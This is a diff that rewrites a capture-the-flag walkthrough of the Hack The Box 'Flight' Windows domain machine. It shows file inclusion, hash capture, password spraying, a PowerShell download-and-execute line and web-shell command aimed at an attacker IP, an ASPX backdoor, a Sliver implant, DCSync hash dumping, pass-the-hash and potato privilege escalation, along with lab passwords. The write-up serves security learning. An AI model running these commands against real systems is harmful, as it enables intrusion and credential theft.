@@ -66,22 +66,13 @@ OS and Service detection performed. Please report any incorrect results at https
 
 ```
 
-- no ldap anonymous bind
-- no smb guest user
-
-port-80 -> web page => nothing interesting — just phpmyadmin
-
-Discovered subdomain:
-- `school.flight.htb`
-- Holds File-Inclusion on the **view** parameter of index.php
-
-Verify the inclusion with the **absolute path** of the hosts file — a default file on every Windows machine:
+No anonymous LDAP bind and no guest SMB user. Port 80 serves nothing interesting — just phpmyadmin — but enumeration turned up a subdomain, `school.flight.htb`, which holds a file inclusion on the **view** parameter of index.php. Verify the inclusion with the **absolute path** of the hosts file, a default file on every Windows machine:
 
 ```URL
 index.php?view=C:\Windows\system32\drivers\etc\hosts
 ```
 
-- It's **filtering** the URL based on the `\` used.. can be switched:
+It filters the URL based on the `\`, but the check can be sidestepped:
 
 ```URL
 index.php?view=C:/Windows/system32/drivers/etc/hosts
@@ -97,20 +88,11 @@ Grabbed the NTLM hash:
 
 > `svc_apache - S@Ss!K@*t13`
 
-Shares with `svc_apache`:
-- Web - Readable
-- Shared - Readable
-- Users - Readable
-
-Nothing useful inside — **Users** holds the home directory of `c.bum`.
-
-Also grab the usernames with `svc_apache` and spray the **password** across them — the person who built the web page is usually a domain user too:
+Shares with `svc_apache` — Web, Shared, and Users — are all readable, but there's nothing useful inside; **Users** just holds the home directory of `c.bum`. Grab the usernames with `svc_apache` and spray the **password** across them, since the person who built the web page is usually a domain user too:
 
 > `S.moon - S@Ss!K@*t13`
 
-Now the shares look different:
-- The **Shared** share is **Writable**
-- but it's empty
+Now the shares look different: **Shared** is writable, but it's empty.
 
 # User
 
@@ -129,7 +111,7 @@ Clone the repo and generate the malicious files:
 python3 ntlm_theft.py -g all -s 10.10.16.82 -f htb
 ```
 
-- Login to the writable share and use **put** to upload the files one by one while responder listens:
+Upload the files to the writable share one by one with **put** while responder listens:
 
 ```sh
 > put desktop.ini
@@ -139,12 +121,8 @@ One of the uploaded files triggers authentication — responder grabs the creds 
 
 > `C.Bum - Tikkycoll_431012284` 
 
-Log in to SMB as C.Bum and grab the user flag from the Users share in c.bum's directory.
+Log in to SMB as C.Bum and grab the user flag from the Users share in c.bum's directory. C.Bum has no shell access, but the Web share is writable by C.bum, and it holds two directories:
 
-- C.Bum has no shell access
-- Web Share is writable by C.bum
-
-The Web share holds two directories:
 - `flight.htb`
 - `school.flight.htb`
 
@@ -177,14 +155,13 @@ sliver > generate --os windows --arch 64bit --mtls 10.10.16.82 --reconnect 60 --
 sliver > generate
 ```
 
-- It will compile and create a payload **htb.exe**
-- Then start a listener:
+It will compile and create a payload **htb.exe**, then start a listener:
 
 ```
 sliver > mtls
 ```
 
-Setup a python server.
+Setup a python server to host the payload.
 
 ---
 > Payload : 
@@ -192,9 +169,7 @@ Setup a python server.
 ```
 powershell -c "wget 10.10.16.82/htb.exe -usebasiparsing -outfile C:\users\public\music\htb.exe; C:\users\public\music\htb.exe
 ```
-- A **powershell** payload which downloads the payload from the server
-- `-usebasiparsing` -> for faster download (Tells PowerShell to use a basic HTML parsing method)
-- And it saves the output to the specific directory and then it's executed
+A **powershell** payload downloads the payload from the server, with `-usebasiparsing` for faster download (it tells PowerShell to use a basic HTML parsing method); it saves the output to the target directory and then executes it.
 ---
 
 ```URL
@@ -207,9 +182,7 @@ or
 curl 'http://flight.htb/bd.php?cmd=powershell%20-c%20%22wget%2010.10.16.82%2Fhtb.exe%20-usebasicparsing%20-outfile%20C%3A%5Cusers%5Cpublic%5Cmusic%5Chtb.exe%3B%20C%3A%5Cusers%5Cpublic%5Cmusic%5Chtb.exe'
 ```
 
-Once the payload executes, we have the sliver session as `svc_apache`.
-
-- Sessions are accessed with:
+Once the payload executes, we have the sliver session as `svc_apache`. Sessions are accessed with:
 
 ```sh
 sliver > sessions -i 3ac
@@ -241,7 +214,7 @@ It prompts for the password interactively — **RunasCs.exe** executes `runas` w
 
 > https://github.com/antonioCoco/RunasCs/releases
 
-- upload the binary
+Upload the binary:
 
 > **Note** : ctrl+d -> to detach from current session in sliver>
 
@@ -275,9 +248,7 @@ Ps > whoami /all
 Get-NetTCPConnection -State Listen
 ```
 
-- same as `netstat -ano` but only limited to **tcp ports**
-
-Also noticed `C:\inetpub` — an IIS server on the system, and **port 8000** is listening, which isn't a default port.
+Same as `netstat -ano`, but limited to **tcp ports**. Also noticed `C:\inetpub` — an IIS server on the system, and **port 8000** is listening, which isn't a default port.
 
 Using sliver to create a SOCKS proxy — exit the shell first:
 
@@ -285,11 +256,9 @@ Using sliver to create a SOCKS proxy — exit the shell first:
 sliver (FAINT_TEXT) > socks5 start
 ```
 
-With the SOCKS tunnel up, reach the internal IIS server — add **FoxyProxy** to **firefox** pointed at the sliver SOCKS5 port.
+With the SOCKS tunnel up, reach the internal IIS server by adding **FoxyProxy** to **firefox** pointed at the sliver SOCKS5 port.
 
-By reviewing **inetpub** we can see `C:\inetpub\development` is what's being hosted. Since c.bum is in WebDevs, he holds write access to that folder.
-
-- It runs the **ASP.NET** framework
+By reviewing **inetpub** we can see `C:\inetpub\development` is what's being hosted. Since c.bum is in WebDevs, he holds write access to that folder. It runs the **ASP.NET** framework.
 
 ---
  **ASPX** (Active Server Pages Extended) is Microsoft's server-side web technology, and **IIS** (Internet Information Services) is Microsoft's web server. They're built together as a native stack.
@@ -302,7 +271,7 @@ Upload a `backdoor.aspx` to `/development` with sliver:
 sliver (FAINT_TEXT) > upload backdoor.aspx 'C:\inetpub\development\backdoor.aspx'
 ```
 
-- Trigger it on the url (or curl):
+Trigger it on the url (or curl):
 
 ```URL
 http://127.0.0.1:8000/backdoor.aspx?cmd=C:\users\public\music\htb.exe
@@ -310,9 +279,7 @@ http://127.0.0.1:8000/backdoor.aspx?cmd=C:\users\public\music\htb.exe
 
 The payload runs — session as `APPPOOL\DeafultAppPool`.
 
-Two ways to escalate:
-- `SeImpersonatePrivilege`
-- `APPPOOL\DefaultAppPool`. This "**user**" is in fact a **Microsoft Virtual Account** and according to Microsoft:
+Two ways to escalate: `SeImpersonatePrivilege`, or the fact that **APPPOOL\DefaultAppPool** — this "**user**" is in fact a **Microsoft Virtual Account** and according to Microsoft:
 > Services that run as virtual accounts access network resources by using the credentials of the computer account in the format `<domain_name>\<computer_name>$`.
 
 That means we can use **Rubeus** from our current session to request a ticket for ourselves (the machine account) and perform a DCSync attack.
@@ -331,20 +298,13 @@ Then run `rubeus` in the current session, which is **Default AppPool**:
 sliver (FAINT_TEXT) > rubeus tgtdeleg /nowrap
 ```
 
-Purpose: Extract a Kerberos Ticket Granting Ticket (TGT) without credentials
+The purpose is to extract a Kerberos Ticket Granting Ticket (TGT) without credentials. The command breaks down into these components:
 
-Components:
 - `rubeus` — Kerberos exploitation tool (C#-based)
 - `tgtdeleg` — TGT Delegation attack module
 - `/nowrap` — Output base64 as single line (not wrapped)
 
-How it works:
-1. Sends Kerberos request to Domain Controller
-2. Requests TGT using GSS-API
-3. Extracts ticket and returns as base64
-4. Ticket can be used for lateral movement or further attacks
-
-- extracted the ticket.kirbi, now decode it:
+It works in four steps: first it sends a Kerberos request to the Domain Controller, then requests a TGT using GSS-API, extracts the ticket and returns it as base64, and finally the ticket can be used for lateral movement or further attacks. Extracted the ticket.kirbi, now decode it:
 
 ```sh
 cat ticket.b64 | base64 -d > ticket.kirbi
@@ -356,13 +316,13 @@ cat ticket.b64 | base64 -d > ticket.kirbi
 pip install minikerberos
 ```
 
-- **minikerberos** holds the **kirbi2ccache** module
+**minikerberos** holds the **kirbi2ccache** module:
 
 ```python
 minikerberos-kirbi2ccache ticket.kirbi ticket.ccache
 ```
 
-- `impacket-secretsdump` to dump the NTLM hashes:
+Now use `impacket-secretsdump` to dump the NTLM hashes:
 
 ```sh
 export KRB5CCNAME=ticket.ccache
@@ -374,9 +334,7 @@ export KRB5CCNAME=ticket.ccache
 faketime "now -16 hours -56 minutes -05 seconds" impacket-secretsdump -k -no-pass g0.flight.htb -target-ip 10.129.228.120 -just-dc-user Administrator
 ```
 
-- `-just-dc-user` -> only dumps the hash of the particular user
-
-- **pth-winexe** works because there's no winrm service:
+With `-just-dc-user`, only the hash of the particular user is dumped. **pth-winexe** works because there's no winrm service:
 
 ```sh
 pth-winexe -U FLIGHT/Administrator //10.129.228.120 cmd.exe 
@@ -395,10 +353,7 @@ The "user" **IIS APPPOOL\DefaultAppPool** is a service/virtual account. This mea
 
 > https://jlajara.gitlab.io/Potatoes_Windows_Privesc
 
-- This privilege is associated with a family of exploits known as "potatoes".
-
-- Essentially what you are trying to achieve is to force the machine to authenticate as **NT AUTHORITY\SYSTEM** to a process you control and then, because you have the **SeImpersonatePrivilege**,
-- create a new process that runs as NT AUTHORITY\SYSTEM. For this example, let's use **SweetPotato** that's actually a collection of potatoes. After you build the project using VisualStudio you can use sliver once again to upload the executable and get a **new session as SYSTEM**.
+This privilege is associated with a family of exploits known as "potatoes". Essentially what you are trying to achieve is to force the machine to authenticate as **NT AUTHORITY\SYSTEM** to a process you control and then, because you have the **SeImpersonatePrivilege**, create a new process that runs as NT AUTHORITY\SYSTEM. For this example, let's use **SweetPotato** that's actually a collection of potatoes. After you build the project using VisualStudio you can use sliver once again to upload the executable and get a **new session as SYSTEM**.
 
 > https://github.com/CCob/SweetPotato
 
